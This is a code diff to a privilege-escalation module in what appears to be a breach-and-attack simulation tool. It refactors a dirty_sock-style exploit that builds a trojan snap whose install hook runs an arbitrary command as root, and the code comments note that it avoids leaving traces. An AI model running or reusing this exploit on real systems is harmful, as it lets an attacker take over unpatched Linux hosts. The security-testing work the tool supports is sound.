@@ -12,7 +12,7 @@ import random
 import subprocess
 from logging import getLogger
 from infection_monkey.pe.actions import HostPrivExploiter
-from infection_monkey.model import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
+from infection_monkey.pe.actions.tools import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
 from infection_monkey.pe.actions.tools import check_if_sudoer, shell, check_system, check_running
 
 LOG = getLogger(__name__)
@@ -21,12 +21,14 @@ __author__ = "D3fa1t"
 
 APPEND_COMMENT = " #"
 SLEEP = 5   # in sec
+PLACEHOLDER_OFFSET = 108  # offset at which we replace the placeholder with our os command
 
 """
 TROJAN_BASE_SNAP contains a simple snap application with an install hook which takes the cmd from the user 
 and if the exploit is successful, then the cmd is run as root 
 
-`BQUF` is a place holder which would later be replace by the cmd that needs to be run as root
+`BQUF` is at offset 108 from the start and is a place holder which would later be replace by the cmd that needs to be 
+ run as root
 """
 
 TROJAN_BASE_SNAP = ('''
@@ -179,14 +181,14 @@ Content-Type: application/octet-stream
     # Exit on failure
     if 'status-code":202' not in http_reply:
         LOG.info("[!] Did not work, here is the API reply:\n\n")
-        LOG.info(http_reply) #debug output
+        LOG.info(http_reply)  #debug output
         return False
 
     # Sleep to allow time for the snap to install correctly. Otherwise,
     # The uninstall that follows will fail, leaving unnecessary traces
     # on the machine.
 
-    time.sleep(8)
+    time.sleep(SLEEP)
     return True
 
 
@@ -199,12 +201,12 @@ def run_command_as_root(command):
     """
     global TROJAN_BASE_SNAP
     command = command + APPEND_COMMENT
-    index = 108 + len(command)
+    index = PLACEHOLDER_OFFSET + len(command)
     trojan_base_snap_decode = TROJAN_BASE_SNAP.decode('base64')
 
     # Create a snap application with out command as the install hook
     trojan_snap = base64.b64encode("".join(
-        (trojan_base_snap_decode[:108], command, trojan_base_snap_decode[index:])))
+        (trojan_base_snap_decode[:PLACEHOLDER_OFFSET], command, trojan_base_snap_decode[index:])))
 
     # Create a random name for the dirty socket file
     sockfile = create_sockfile()
